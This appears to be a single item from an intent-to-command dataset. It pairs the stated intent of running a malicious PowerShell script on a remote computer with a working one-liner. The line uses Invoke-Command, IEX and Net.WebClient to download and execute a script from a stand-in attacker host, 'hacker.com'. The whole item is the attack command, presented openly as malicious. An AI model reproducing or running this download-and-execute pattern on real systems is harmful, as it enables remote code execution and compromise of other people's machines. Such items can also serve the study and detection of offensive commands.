# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious PowerShell script.

Invoke-Command -ComputerName <Name> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://hacker.com/malware/bad.ps1')}
